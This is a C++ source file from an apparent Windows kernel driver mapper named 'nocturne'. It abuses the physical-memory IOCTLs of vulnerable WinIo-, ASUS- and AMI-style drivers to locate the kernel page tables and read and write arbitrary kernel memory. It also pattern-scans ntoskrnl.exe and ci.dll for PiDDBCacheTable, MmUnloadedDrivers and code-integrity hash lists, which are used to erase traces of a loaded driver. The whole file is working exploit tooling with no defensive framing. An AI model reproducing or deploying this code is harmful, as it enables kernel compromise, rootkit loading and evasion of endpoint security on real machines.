#include "../include/carrier_io.hpp"
#include <psapi.h>
#include <algorithm>
#include <iostream>

#pragma comment(lib, "Psapi.lib")

namespace nocturne {

CarrierIo::CarrierIo(const MapperConfig& cfg) : m_cfg(cfg) {
    ResolveLocalSystemSymbols(m_cfg.symbols);
}

CarrierIo::~CarrierIo() {
    Disconnect();
}

static uint32_t FindExportRvaInMappedPe(const uint8_t* base, const char* exportName) {
    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(base + dos->e_lfanew);
    const auto& expEntry = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expEntry.VirtualAddress || !expEntry.Size) return 0;

    auto* expDir = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(base + expEntry.VirtualAddress);
    auto* names = reinterpret_cast<const uint32_t*>(base + expDir->AddressOfNames);
    auto* ords = reinterpret_cast<const uint16_t*>(base + expDir->AddressOfNameOrdinals);
    auto* funcs = reinterpret_cast<const uint32_t*>(base + expDir->AddressOfFunctions);

    for (uint32_t i = 0; i < expDir->NumberOfNames; ++i) {
        const char* cur = reinterpret_cast<const char*>(base + names[i]);
        if (strcmp(cur, exportName) == 0) {
            return funcs[ords[i]];
        }
    }
    return 0;
}

bool CarrierIo::ResolveLocalSystemSymbols(SymbolConfig& sym) {
    // Map local ntoskrnl.exe and ci.dll in user-mode (DONT_RESOLVE_DLL_REFERENCES)
    // so PAGE sections are 100% resident on ANY Windows 10 / 11 build without touching Ring 0 paged-out memory.
    HMODULE hNtos = LoadLibraryExW(L"C:\\Windows\\System32\\ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (hNtos) {
        const auto* base = reinterpret_cast<const uint8_t*>(hNtos);
        auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
        auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(base + dos->e_lfanew);
        uint32_t rvaLookupAvl = FindExportRvaInMappedPe(base, "RtlLookupElementGenericTableAvl");
        uint32_t rvaAcquireRes = FindExportRvaInMappedPe(base, "ExAcquireResourceExclusiveLite");

        auto* sec = IMAGE_FIRST_SECTION(nt);
        for (uint16_t s = 0; s < nt->FileHeader.NumberOfSections; ++s, ++sec) {
            char secName[9] = {};
            memcpy(secName, sec->Name, 8);
            uint32_t secSize = sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
            const uint8_t* secPtr = base + sec->VirtualAddress;

            if ((strcmp(secName, "PAGE") == 0 || strcmp(secName, ".text") == 0) && secSize > 256) {
                // 1. Universal call-graph resolution for PiDDBCacheTable & PiDDBLock across Win10 & Win11
                for (uint32_t i = 0; i + 16 < secSize; ++i) {
                    if (sym.rvaPiDDBCacheTable == 0 &&
                        secPtr[i] == 0x66 && secPtr[i + 1] == 0x03 && secPtr[i + 2] == 0xD2 &&
                        secPtr[i + 3] == 0x48 && secPtr[i + 4] == 0x8D && secPtr[i + 5] == 0x0D) {
                        int32_t disp = *reinterpret_cast<const int32_t*>(&secPtr[i + 6]);
                        sym.rvaPiDDBCacheTable = sec->VirtualAddress + i + 3 + 7 + disp;
                    }

                    // Match E8 call to ExAcquireResourceExclusiveLite preceded by LEA RCX, [rip+disp]
                    if (secPtr[i] == 0xE8 && rvaAcquireRes != 0) {
                        int32_t callRel = *reinterpret_cast<const int32_t*>(&secPtr[i + 1]);
                        uint32_t callTarget = sec->VirtualAddress + i + 5 + callRel;
                        if (callTarget == rvaAcquireRes && i >= 16) {
                            // Check if this function or its immediate callee references RtlLookupElementGenericTableAvl
                            bool nearAvl = false;
                            for (uint32_t k = i; k < (std::min)(secSize - 5, i + 0x700); ++k) {
                                if (secPtr[k] == 0xE8) {
                                    int32_t r2 = *reinterpret_cast<const int32_t*>(&secPtr[k + 1]);
                                    if (sec->VirtualAddress + k + 5 + r2 == rvaLookupAvl) {
                                        nearAvl = true;
                                        break;
                                    }
                                }
                            }
                            if (nearAvl) {
                                for (uint32_t back = 7; back <= 20; ++back) {
                                    if (secPtr[i - back] == 0x48 && secPtr[i - back + 1] == 0x8D && secPtr[i - back + 2] == 0x0D) {
                                        int32_t lockDisp = *reinterpret_cast<const int32_t*>(&secPtr[i - back + 3]);
                                        sym.rvaPiDDBLock = sec->VirtualAddress + (i - back) + 7 + lockDisp;
                                        break;
                                    }
                                }
                            }
                        }
                    }

                    // 2. Universal resolution for MmUnloadedDrivers & MmLastUnloadedDriver
                    if (sym.rvaMmUnloadedDrivers == 0 &&
                        secPtr[i] == 0x4C && secPtr[i + 1] == 0x8B && (secPtr[i + 2] & 0xC7) == 0x05 &&
                        secPtr[i + 7] == 0x4C && secPtr[i + 8] == 0x8B && secPtr[i + 9] == 0xC9 &&
                        secPtr[i + 10] == 0x4D && secPtr[i + 11] == 0x85 && secPtr[i + 13] == 0x74) {
                        int32_t disp = *reinterpret_cast<const int32_t*>(&secPtr[i + 3]);
                        sym.rvaMmUnloadedDrivers = sec->VirtualAddress + i + 7 + disp;
                        for (int32_t w = -64; w <= 64; ++w) {
                            if (static_cast<int64_t>(i) + w > 0 && i + w + 6 < secSize && secPtr[i + w] == 0x8B && secPtr[i + w + 1] == 0x05) {
                                int32_t lastDisp = *reinterpret_cast<const int32_t*>(&secPtr[i + w + 2]);
                                sym.rvaMmLastUnloadedDriver = sec->VirtualAddress + (i + w) + 6 + lastDisp;
                                break;
                            }
                        }
                    }
                }
            }
        }
        FreeLibrary(hNtos);
    }

    HMODULE hCi = LoadLibraryExW(L"C:\\Windows\\System32\\ci.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (hCi) {
        const auto* base = reinterpret_cast<const uint8_t*>(hCi);
        auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
        auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(base + dos->e_lfanew);
        auto* sec = IMAGE_FIRST_SECTION(nt);
        for (uint16_t s = 0; s < nt->FileHeader.NumberOfSections; ++s, ++sec) {
            char secName[9] = {};
            memcpy(secName, sec->Name, 8);
            uint32_t secSize = sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
            const uint8_t* secPtr = base + sec->VirtualAddress;
            if (strcmp(secName, "PAGE") == 0 && secSize > 64) {
                for (uint32_t i = 0; i + 16 < secSize; ++i) {
                    if (sym.rvaKernelHashBucketList == 0 &&
                        secPtr[i] == 0x48 && secPtr[i + 1] == 0x8B && secPtr[i + 2] == 0x1D &&
                        secPtr[i + 7] == 0xEB && secPtr[i + 9] == 0xF7 && secPtr[i + 10] == 0x43 && secPtr[i + 11] == 0x40) {
                        int32_t bDisp = *reinterpret_cast<const int32_t*>(&secPtr[i + 3]);
                        sym.rvaKernelHashBucketList = sec->VirtualAddress + i + 7 + bDisp;
                        for (uint32_t back = 7; back <= 48 && i >= back; ++back) {
                            if (secPtr[i - back] == 0x48 && secPtr[i - back + 1] == 0x8D && secPtr[i - back + 2] == 0x0D) {
                                int32_t lDisp = *reinterpret_cast<const int32_t*>(&secPtr[i - back + 3]);
                                sym.rvaHashCacheLock = sec->VirtualAddress + (i - back) + 7 + lDisp;
                                break;
                            }
                        }
                    }
                }
            }
        }
        FreeLibrary(hCi);
    }
    return sym.rvaPiDDBCacheTable != 0 && sym.rvaPiDDBLock != 0;
}

bool CarrierIo::Connect() {
    if (m_hDevice != INVALID_HANDLE_VALUE) return true;
    m_hDevice = CreateFileW(
        m_cfg.carrier.deviceLink.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    if (m_hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }
    return InitializePageTables();
}

void CarrierIo::Disconnect() {
    if (m_hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
    }
}

uint8_t* CarrierIo::MapPhysical(uint64_t physAddr, size_t size, void* outStateBuffer, size_t stateBufSize) {
    if (m_hDevice == INVALID_HANDLE_VALUE || !size) return nullptr;
    DWORD bytesReturned = 0;

    if (m_cfg.carrier.format == PacketFormat::WinIoStruct) {
        if (stateBufSize < sizeof(WinIoPhysPacket)) return nullptr;
        auto* pkt = reinterpret_cast<WinIoPhysPacket*>(outStateBuffer);
        ZeroMemory(pkt, sizeof(WinIoPhysPacket));
        pkt->physAddress = physAddr;
        pkt->size = size;
        if (!DeviceIoControl(m_hDevice, m_cfg.carrier.ioctlMapPhys, pkt, sizeof(WinIoPhysPacket), pkt, sizeof(WinIoPhysPacket), &bytesReturned, nullptr)) {
            return nullptr;
        }
        return reinterpret_cast<uint8_t*>(pkt->mappedLinearAddress);
    }

    if (m_cfg.carrier.format == PacketFormat::AsusStruct) {
        if (stateBufSize < sizeof(AsusPhysPacket)) return nullptr;
        auto* pkt = reinterpret_cast<AsusPhysPacket*>(outStateBuffer);
        ZeroMemory(pkt, sizeof(AsusPhysPacket));
        pkt->physAddress = physAddr;
        pkt->size = static_cast<uint32_t>(size);
        if (!DeviceIoControl(m_hDevice, m_cfg.carrier.ioctlMapPhys, pkt, sizeof(AsusPhysPacket), pkt, sizeof(AsusPhysPacket), &bytesReturned, nullptr)) {
            return nullptr;
        }
        return reinterpret_cast<uint8_t*>(pkt->mappedLinearAddress);
    }

    if (m_cfg.carrier.format == PacketFormat::AmiStruct) {
        if (stateBufSize < sizeof(AmiPhysPacket)) return nullptr;
        auto* pkt = reinterpret_cast<AmiPhysPacket*>(outStateBuffer);
        ZeroMemory(pkt, sizeof(AmiPhysPacket));
        pkt->physAddress = physAddr;
        pkt->size = static_cast<uint32_t>(size);
        if (!DeviceIoControl(m_hDevice, m_cfg.carrier.ioctlMapPhys, pkt, sizeof(AmiPhysPacket), pkt, sizeof(AmiPhysPacket), &bytesReturned, nullptr)) {
            return nullptr;
        }
        return reinterpret_cast<uint8_t*>(pkt->mappedLinearAddress);
    }

    return nullptr;
}

bool CarrierIo::UnmapPhysical(void* stateBuffer, size_t stateBufSize) {
    if (m_hDevice == INVALID_HANDLE_VALUE || !stateBuffer) return false;
    DWORD bytesReturned = 0;

    if (m_cfg.carrier.format == PacketFormat::WinIoStruct && stateBufSize >= sizeof(WinIoPhysPacket)) {
        return DeviceIoControl(m_hDevice, m_cfg.carrier.ioctlUnmapPhys, stateBuffer, sizeof(WinIoPhysPacket), stateBuffer, sizeof(WinIoPhysPacket), &bytesReturned, nullptr) != FALSE;
    }
    if (m_cfg.carrier.format == PacketFormat::AsusStruct && stateBufSize >= sizeof(AsusPhysPacket)) {
        return DeviceIoControl(m_hDevice, m_cfg.carrier.ioctlUnmapPhys, stateBuffer, sizeof(AsusPhysPacket), stateBuffer, sizeof(AsusPhysPacket), &bytesReturned, nullptr) != FALSE;
    }
    if (m_cfg.carrier.format == PacketFormat::AmiStruct && stateBufSize >= sizeof(AmiPhysPacket)) {
        return DeviceIoControl(m_hDevice, m_cfg.carrier.ioctlUnmapPhys, stateBuffer, sizeof(AmiPhysPacket), stateBuffer, sizeof(AmiPhysPacket), &bytesReturned, nullptr) != FALSE;
    }
    return false;
}

bool CarrierIo::ReadPhysical(uint64_t physAddr, void* buffer, size_t size) {
    if (!physAddr || !buffer || !size) return false;
    uint8_t state[64] = {};
    uint8_t* mapped = MapPhysical(physAddr, size, state, sizeof(state));
    if (!mapped) return false;
    memcpy(buffer, mapped, size);
    UnmapPhysical(state, sizeof(state));
    return true;
}

bool CarrierIo::WritePhysical(uint64_t physAddr, const void* buffer, size_t size) {
    if (!physAddr || !buffer || !size) return false;
    uint8_t state[64] = {};
    uint8_t* mapped = MapPhysical(physAddr, size, state, sizeof(state));
    if (!mapped) return false;
    memcpy(mapped, buffer, size);
    UnmapPhysical(state, sizeof(state));
    return true;
}

uint64_t CarrierIo::GetKernelModuleBase(const std::string& moduleName, uint32_t* outSize) {
    DWORD cbNeeded = 0;
    EnumDeviceDrivers(nullptr, 0, &cbNeeded);
    if (!cbNeeded) return 0;

    std::vector<LPVOID> drivers(cbNeeded / sizeof(LPVOID));
    if (!EnumDeviceDrivers(drivers.data(), cbNeeded, &cbNeeded)) return 0;

    auto toLower = [](std::string s) {
        std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
        return s;
    };
    std::string targetLower = toLower(moduleName);

    for (LPVOID base : drivers) {
        if (!base) continue;
        char baseName[256] = {};
        if (GetDeviceDriverBaseNameA(base, baseName, sizeof(baseName))) {
            if (toLower(baseName) == targetLower) {
                uint64_t foundBase = reinterpret_cast<uint64_t>(base);
                if (outSize && m_systemCr3) {
                    IMAGE_DOS_HEADER dos{};
                    if (ReadKernelVirtual(foundBase, &dos, sizeof(dos)) && dos.e_magic == IMAGE_DOS_SIGNATURE) {
                        IMAGE_NT_HEADERS64 nt{};
                        if (ReadKernelVirtual(foundBase + dos.e_lfanew, &nt, sizeof(nt)) && nt.Signature == IMAGE_NT_SIGNATURE) {
                            *outSize = nt.OptionalHeader.SizeOfImage;
                        }
                    }
                }
                return foundBase;
            }
        }
    }
    return 0;
}

bool CarrierIo::InitializePageTables() {
    m_ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
    if (!m_ntoskrnlBase) return false;

    if (m_cfg.symbols.explicitSystemCr3 != 0) {
        m_systemCr3 = m_cfg.symbols.explicitSystemCr3;
        return true;
    }

    // Scan low physical stub (0x1000..0x100000) for PROCESSOR_START_BLOCK containing kernel CR3 (PML4)
    std::vector<uint8_t> lowStub(0x1000);
    for (uint64_t physPage = 0x1000; physPage < 0x100000; physPage += 0x1000) {
        if (!ReadPhysical(physPage, lowStub.data(), 0x1000)) continue;

        // PROCESSOR_START_BLOCK signature check:
        // Offsets 0x000: JMP instruction (0xE9 ...), 0x070: LmTarget (Kernel VA), 0x0A0: Cr3 (PML4 physical address)
        for (size_t offset = 0; offset <= 0xF00; offset += 0x10) {
            uint64_t lmTarget = *reinterpret_cast<uint64_t*>(&lowStub[offset + 0x70]);
            uint64_t candidateCr3 = *reinterpret_cast<uint64_t*>(&lowStub[offset + 0xA0]);
            if ((lmTarget & 0xFFFFF80000000000ULL) == 0xFFFFF80000000000ULL &&
                candidateCr3 != 0 && (candidateCr3 & 0xFFF) == 0 && candidateCr3 < 0x1000000000ULL) {
                uint64_t testPhys = TranslateLinearAddress(candidateCr3, m_ntoskrnlBase);
                if (testPhys != 0) {
                    uint16_t mz = 0;
                    if (ReadPhysical(testPhys, &mz, sizeof(mz)) && mz == IMAGE_DOS_SIGNATURE) {
                        m_systemCr3 = candidateCr3;
                        GetKernelModuleBase("ntoskrnl.exe", &m_ntoskrnlSize);
                        return true;
                    }
                }
            }
        }
    }
    return false;
}

uint64_t CarrierIo::TranslateLinearAddress(uint64_t directoryTableBase, uint64_t virtualAddress, uint64_t* outPtePhysAddr) {
    directoryTableBase &= ~0xFULL;
    if (!directoryTableBase) return 0;

    uint64_t pageOffset = virtualAddress & 0xFFFULL;
    uint64_t ptIndex = (virtualAddress >> 12) & 0x1FFULL;
    uint64_t pdIndex = (virtualAddress >> 21) & 0x1FFULL;
    uint64_t pdptIndex = (virtualAddress >> 30) & 0x1FFULL;
    uint64_t pml4Index = (virtualAddress >> 39) & 0x1FFULL;

    PageTableEntry pml4e{};
    if (!ReadPhysical(directoryTableBase + pml4Index * sizeof(uint64_t), &pml4e.value, sizeof(uint64_t)) || !pml4e.present) {
        return 0;
    }

    PageTableEntry pdpte{};
    uint64_t pdptPhys = (pml4e.pageFrameNumber << 12) + pdptIndex * sizeof(uint64_t);
    if (!ReadPhysical(pdptPhys, &pdpte.value, sizeof(uint64_t)) || !pdpte.present) {
        return 0;
    }
    // 1GB huge page
    if (pdpte.largePage) {
        if (outPtePhysAddr) *outPtePhysAddr = pdptPhys;
        return ((pdpte.value & 0xFFFFFC0000000ULL) + (virtualAddress & 0x3FFFFFFFULL));
    }

    PageTableEntry pde{};
    uint64_t pdPhys = (pdpte.pageFrameNumber << 12) + pdIndex * sizeof(uint64_t);
    if (!ReadPhysical(pdPhys, &pde.value, sizeof(uint64_t)) || !pde.present) {
        return 0;
    }
    // 2MB large page
    if (pde.largePage) {
        if (outPtePhysAddr) *outPtePhysAddr = pdPhys;
        return ((pde.value & 0xFFFFFFFE00000ULL) + (virtualAddress & 0x1FFFFFULL));
    }

    PageTableEntry pte{};
    uint64_t ptePhys = (pde.pageFrameNumber << 12) + ptIndex * sizeof(uint64_t);
    if (!ReadPhysical(ptePhys, &pte.value, sizeof(uint64_t)) || !pte.present) {
        return 0;
    }
    if (outPtePhysAddr) *outPtePhysAddr = ptePhys;
    return (pte.pageFrameNumber << 12) + pageOffset;
}

bool CarrierIo::ReadKernelVirtual(uint64_t virtualAddr, void* buffer, size_t size) {
    if (!m_systemCr3 || !virtualAddr || !buffer || !size) return false;
    uint8_t* dst = reinterpret_cast<uint8_t*>(buffer);
    size_t remaining = size;
    uint64_t curVa = virtualAddr;

    while (remaining > 0) {
        uint64_t pageOffset = curVa & 0xFFFULL;
        size_t chunk = (std::min)(remaining, static_cast<size_t>(0x1000ULL - pageOffset));
        uint64_t phys = TranslateLinearAddress(m_systemCr3, curVa);
        if (!phys || !ReadPhysical(phys, dst, chunk)) return false;
        dst += chunk;
        curVa += chunk;
        remaining -= chunk;
    }
    return true;
}

bool CarrierIo::WriteKernelVirtual(uint64_t virtualAddr, const void* buffer, size_t size) {
    if (!m_systemCr3 || !virtualAddr || !buffer || !size) return false;
    const uint8_t* src = reinterpret_cast<const uint8_t*>(buffer);
    size_t remaining = size;
    uint64_t curVa = virtualAddr;

    while (remaining > 0) {
        uint64_t pageOffset = curVa & 0xFFFULL;
        size_t chunk = (std::min)(remaining, static_cast<size_t>(0x1000ULL - pageOffset));
        uint64_t phys = TranslateLinearAddress(m_systemCr3, curVa);
        if (!phys || !WritePhysical(phys, src, chunk)) return false;
        src += chunk;
        curVa += chunk;
        remaining -= chunk;
    }
    return true;
}

uint64_t CarrierIo::GetKernelModuleExport(uint64_t kernelModuleBase, const std::string& exportName) {
    if (!kernelModuleBase || exportName.empty()) return 0;

    IMAGE_DOS_HEADER dos{};
    if (!ReadKernelVirtual(kernelModuleBase, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS64 nt{};
    if (!ReadKernelVirtual(kernelModuleBase + dos.e_lfanew, &nt, sizeof(nt)) || nt.Signature != IMAGE_NT_SIGNATURE) return 0;

    const auto& expDirEntry = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDirEntry.VirtualAddress || !expDirEntry.Size) return 0;

    std::vector<uint8_t> expBuffer(expDirEntry.Size);
    if (!ReadKernelVirtual(kernelModuleBase + expDirEntry.VirtualAddress, expBuffer.data(), expBuffer.size())) return 0;

    auto delta = reinterpret_cast<uintptr_t>(expBuffer.data()) - expDirEntry.VirtualAddress;
    auto* expDir = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(expBuffer.data());

    auto* namesRva = reinterpret_cast<uint32_t*>(expDir->AddressOfNames + delta);
    auto* ordinals = reinterpret_cast<uint16_t*>(expDir->AddressOfNameOrdinals + delta);
    auto* funcsRva = reinterpret_cast<uint32_t*>(expDir->AddressOfFunctions + delta);

    for (uint32_t i = 0; i < expDir->NumberOfNames; ++i) {
        const char* curName = reinterpret_cast<const char*>(namesRva[i] + delta);
        if (exportName == curName) {
            uint16_t ord = ordinals[i];
            uint32_t fnRva = funcsRva[ord];
            // Check forwarded export
            if (fnRva >= expDirEntry.VirtualAddress && fnRva < expDirEntry.VirtualAddress + expDirEntry.Size) {
                return 0;
            }
            return kernelModuleBase + fnRva;
        }
    }
    return 0;
}

uint64_t CarrierIo::FindPatternInModule(uint64_t kernelModuleBase, const char* pattern, const char* mask, const char* sectionFilter) {
    if (!kernelModuleBase || !pattern || !mask) return 0;

    IMAGE_DOS_HEADER dos{};
    if (!ReadKernelVirtual(kernelModuleBase, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS64 nt{};
    if (!ReadKernelVirtual(kernelModuleBase + dos.e_lfanew, &nt, sizeof(nt)) || nt.Signature != IMAGE_NT_SIGNATURE) return 0;

    uint16_t numSections = nt.FileHeader.NumberOfSections;
    std::vector<IMAGE_SECTION_HEADER> sections(numSections);
    uint64_t secHeaderVa = kernelModuleBase + dos.e_lfanew + offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + nt.FileHeader.SizeOfOptionalHeader;
    if (!ReadKernelVirtual(secHeaderVa, sections.data(), numSections * sizeof(IMAGE_SECTION_HEADER))) return 0;

    size_t patLen = strlen(mask);
    for (const auto& sec : sections) {
        if (sectionFilter) {
            char secName[9] = {};
            memcpy(secName, sec.Name, 8);
            if (strcmp(secName, sectionFilter) != 0) continue;
        }
        uint32_t secSize = sec.Misc.VirtualSize ? sec.Misc.VirtualSize : sec.SizeOfRawData;
        if (secSize < patLen) continue;

        std::vector<uint8_t> secData(secSize);
        if (!ReadKernelVirtual(kernelModuleBase + sec.VirtualAddress, secData.data(), secSize)) continue;

        for (size_t i = 0; i <= secSize - patLen; ++i) {
            bool matched = true;
            for (size_t j = 0; j < patLen; ++j) {
                if (mask[j] == 'x' && secData[i + j] != static_cast<uint8_t>(pattern[j])) {
                    matched = false;
                    break;
                }
            }
            if (matched) {
                return kernelModuleBase + sec.VirtualAddress + i;
            }
        }
    }
    return 0;
}

uint64_t CarrierIo::ResolveRelativeRip(uint64_t instructionAddr, uint32_t offsetOffset, uint32_t instructionSize) {
    int32_t relOffset = 0;
    if (!ReadVal(instructionAddr + offsetOffset, relOffset)) return 0;
    return instructionAddr + instructionSize + relOffset;
}

} // namespace nocturne
